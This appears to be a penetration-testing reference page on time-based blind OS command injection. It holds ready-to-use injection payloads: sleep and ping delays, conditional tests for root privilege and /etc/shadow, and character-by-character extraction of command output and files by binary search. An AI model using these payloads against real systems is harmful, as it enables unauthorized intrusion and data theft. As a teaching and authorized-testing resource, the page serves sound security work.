---
title: "Blind command injection time-based oracle"
description: "Using sleep and ping delays as a boolean oracle in blind OS command injection to confirm execution and extract data character by character when no output and no out-of-band channel exist."
keywords:
  - blind command injection
  - time-based oracle
  - sleep
  - ping delay
  - data extraction
  - boolean inference
---

# Time-based blind extraction

When a command runs blind—no output reflected—and no out-of-band channel is available (egress fully filtered, DNS blocked), a **measurable delay** becomes the only signal. Forcing the server to pause for a known interval turns response time into a one-bit oracle: slow means *true*, fast means *false*. Gate that delay on a condition and you can read data one character at a time.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.

## Confirming execution

Inject a command that blocks for a fixed time and compare against the baseline response:

```
127.0.0.1; sleep 10
127.0.0.1 && sleep 10
127.0.0.1 || sleep 10        # when the first command is made to fail
```

Where `sleep` is unavailable or filtered, `ping` against loopback yields a predictable delay:

```
127.0.0.1 & ping -c 10 127.0.0.1      # POSIX: ~10s (one packet/sec)
127.0.0.1 & ping -n 10 127.0.0.1      # Windows: -n, not -c
```

A ten-second jump over baseline confirms the command executed. Run each test twice to rule out network jitter; pick a delay long enough to stand clear of normal variance (5–10s is typical).

## Building the boolean oracle

Make the delay conditional so it reports the truth of a test:

```
127.0.0.1; [ $(id -u) -eq 0 ] && sleep 10            # true if running as root
127.0.0.1; [ -f /etc/shadow ] && sleep 10            # true if the file exists
```

Slow response = condition true; immediate = false. This mirrors blind SQL injection inference, applied to shell state.

## Character-by-character extraction

Combine the oracle with string slicing to recover data without any output channel. Test one position against one candidate character; a delay confirms a match:

```
# is the first char of whoami 'r'?
127.0.0.1; [ "$(whoami|cut -c1)" = "r" ] && sleep 10

# walk a file, position by position
127.0.0.1; [ "$(cut -c2 /etc/hostname)" = "p" ] && sleep 10
```

Iterate position `1..n` and candidate over the charset. A **binary search** on the byte value collapses ~26–95 guesses per character to ~7, which matters because every test costs one full delay:

```
127.0.0.1; [ $(printf %d "'$(id|cut -c1)") -gt 109 ] && sleep 10
```

`cut`, `dd`, `head -c`, and `${var:offset:len}` all slice; `printf %d "'X"` gives a character's ordinal for comparison.

## Reducing cost

Time-based extraction is the slowest channel—one request per bit or per guess. Keep it practical by:

- **Binary search** on ordinals rather than linear charset scans.
- **Short delays** (2–3s) once you've measured baseline variance.
- **Scripting** the loop (Burp Intruder with a timing payload, or a small requests/`curl` driver) and reading the elapsed time programmatically.
- Narrowing the alphabet first (is it `[a-z]`, `[0-9]`, uppercase?) before pinning the exact byte.

## Platform note

`sleep` is POSIX; on Windows `cmd.exe` use `ping -n <sec+1> 127.0.0.1` or `timeout /t <sec>` for the delay. PowerShell offers `Start-Sleep -s <sec>`.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** Intruder/Repeater — send timed payloads and sort by response time.
- **[commix](https://github.com/commixproject/commix)** — `--technique=t` automates time-based blind extraction.

## References

- [PortSwigger Web Security Academy: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection)
- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
